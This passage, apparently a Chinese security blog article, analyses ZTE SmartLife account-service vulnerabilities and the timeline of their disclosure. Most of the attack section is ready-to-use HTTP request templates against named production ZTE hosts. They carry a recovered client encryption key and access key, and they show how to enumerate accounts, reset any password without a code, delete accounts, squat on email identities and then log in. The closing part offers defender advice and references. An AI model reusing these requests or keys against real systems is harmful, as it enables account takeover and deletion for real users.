POST /zte-sec-uac-iportalbff/external/account/verify.serv HTTP/1.1
Host: zxuacde.smart-zte.com
X-App-Id: 271950143414
X-Tenant-Id: 10001
X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
X-Lang-Id: en_US
Content-Type: application/json
 
{
  "key": "<aes_gcm_encrypt(email, key="djrom(&)(&)MORJD")>"
}
 
registered   -> code=0000 + accountId
unregistered -> code=0004
```  
  
> 弱点：目标电子邮件使用恢复的客户端密钥进行加密djrom(&amp;)(&amp;)MORJD。该端点充当注册帐户预言机，并在成功路径中泄露后端帐户标识符（CVE-2026-86554）。  
  
  
漏洞3：无需验证码即可重置密码  
  
```http
POST /zte-sec-uac-iportalbff/external/account/password/reset.serv HTTP/1.1
Host: zxuacde.smart-zte.com
X-App-Id: 271950143414
X-Tenant-Id: 10001
X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
X-Lang-Id: en_US
Content-Type: application/json
 
{
  "accountId":"A<target accountId>",
  "newPassword":"<attacker-selected password>"
  // noreset code, no old password, no bound reset transaction
}
```  
  
> 漏洞：仅凭账户 ID 和新密码即可更改账户状态。缺少验证步骤是该漏洞的根源 (CVE-2026-86553)。  
  
  
缺陷 4. 在先前运行时选择的路径上，未使用用户令牌删除帐户  
  
```http
POST /zte-sec-uac-iportalbff/external/account/delete.serv HTTP/1.1
Host: uactest.ztems.com
X-App-Id: 271950143414
X-Tenant-Id: 10001
X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
X-Emp-No: A<target accountId>
X-Lang-Id: en_US
Content-Type: application/json
 
{
  "accountId":"A<target accountId>"
  // no user Bearer token in the validated earlier-path behavior
}
```  
  
> 弱点：早期版本接受应用上下文和账户标识符来进行破坏性账户操作。中兴通讯后来表示，正式版需要使用令牌。  
  
  
漏洞5：任意邮箱预注册/账号抢注  
  
```http
POST /zte-sec-uac-iportalbff/external/account/person/signup.serv HTTP/1.1
Host: zxuacde.smart-zte.com
X-App-Id: 271950143414
X-Tenant-Id: 10001
X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
X-Lang-Id: en_US
Content-Type: application/json
 
{
  "email":"<arbitrary victim identity>",
  "password":"<chosen password>",
  "countryCode":"DE",
  "mailboxOwnership":"not yet proven"
}
```  
  
> 弱点：在邮箱所有权得到证明之前，帐户创建和后续登录均已成功，从而允许身份预留和抢注（CVE-2026-86552）。  
  
  
后置条件：使用新密码登录  
  
```http
POST /zte-sec-uac-iportalbff/external/auth/login.serv HTTP/1.1
Host: zxuacde.smart-zte.com
X-App-Id: 271950143414
X-Tenant-Id: 10001
X-Itp-Value: accessKey=271950143414fnu4mb3lxxotfj5mi1tp
X-Auth-Value: <fresh AES-GCM token encrypted with"djrom(&)(&)MORJD">
X-Lang-Id: en_US
Content-Type: application/json
 
{
  "loginName": "<aes_gcm_encrypt(email, key="djrom(&)(&)MORJD")>",
  "passWord": "<aes_gcm_encrypt(newPassword, key="djrom(&)(&)MORJD")>",
  "loginSystemCode":"271950143414",
  "loginClientIp":"127.0.0.1",
  "verifyCode":"<sha256_hex(loginName + passWord + ip + systemCode)>"
}
```  
  
> 证明：使用攻击者设置的密码（经过加密）djrom(&amp;)(&amp;)MORJD和相应的 verifyCode 哈希值，登录会返回证明帐户的有效会话令牌。  
  
## 五、结束语  
  
这批编号真正的看点不在评分。四条记录里有两条在同一天被修订过，修订方向是把影响面判断改得更重，86553 的作用域、完整性与可用性三个分量同时被改。  
  
完整 PoC 与密钥参数表在末条编号发布后不到十小时就出现在公开仓库里。发布决定所依赖的那句「已修补、密钥已轮换」，在公开材料里找不到可核路径。唯一被复核过的负向结果落在厂商已经排除的那一项上，另有一类密钥材料连编号都没有拿到。  
  
对防御方而言需要接受两个前提。服务端的修复状态无法从客户端版本读出。编号发布也不再是风险的起点，本案里风险起点比编号发布早了三十多天，而强度更高的那一步即完整利用材料公开，比编号发布只晚了不到十小时。  
  
唯有把账号生命周期事件纳入常态监控、把托管设备的版本核查做成常规动作、并且在拿到编号时不把 CVSS 排序当成排查顺序，才能在「修复已经完成而链条已经公开」这类窗口里，不被时间差推着走。  
## 六、参考  
  
```
ZTE PSIRT 公告 SA-202609-1732793（CVE-2026-86552）
https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/460174866982102946

ZTE PSIRT 公告 SA-202609-1732788（CVE-2026-86553）
https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/2171542593031840100

ZTE PSIRT 公告 SA-202609-1732784（CVE-2026-86554）
https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/2171542593031840113

ZTE PSIRT 公告 SA-202609-1731629（CVE-2026-86555）
https://support.zte.com.cn/zte-iccp-isupport-webui/bulletin/detail/874505866159007054

ZTE PSIRT 响应流程与服务承诺
https://www.zte.com.cn/global/about/trust-center/ztepsirt.html

CVE.org 记录（CNA 为 ZTE Corporation）
https://www.cve.org/CVERecord?id=CVE-2026-86552

NVD 记录接口
https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-86553

CVE 记录初版与提交历史（5.1 与 5.2 两节的依据）
https://github.com/CVEProject/cvelistV5/commits/main/cves/2026/86xxx/CVE-2026-86553.json

CISA KEV 全量目录（2026-09-21 版本，1,717 条，ZTE 条目为零）
https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json

EPSS公开接口（CVE-2026-86553，取值日期2026-09-21）
https://api.first.org/data/v1/epss?cve=CVE-2026-86553

报告人技术文章与 PoC 仓库
https://minanagehsalalma.github.io/zte-smartlife-app-pwned/
https://github.com/minanagehsalalma/zte-smartlife-app-pwned

GooglePlay应用页（版本2.8.4，更新日期2026-08-19，下载量100K+）
https://play.google.com/store/apps/details?id=com.zte.smarthome.abroad

AppStore版本历史（2.8.4发布于2026-08-21）
https://apps.apple.com/cn/app/zte-smartlife/id6462980142

转载侧对照（5.3 与 5.4 两节的依据，均为 CVE-2026-86552 至 86555 详情页）
cvefeed.io、cve.circl.lu、byteos.network、dbu.gs、cvetodo.com、techgeeks.org、rdintel.com
```  
  
  
**END**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0G3BIEHLsL2SLv0Rc302U6lD45p86IrmJickdThYm45ox2qPwS4ibCxGURU2UaEp2g1lps22icyjgYx12lVYAcMKUOxicffyUD85ick/640?wx_fmt=jpeg&from=appmsg "")  
  
  
公众号内容都来自国外等平台- 搜索的内容通过结合编写 -   
  
三方单独接广被举报 - 没收入广告已开  
  
公众号 |   
AnQuan7 (Ots安全)  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
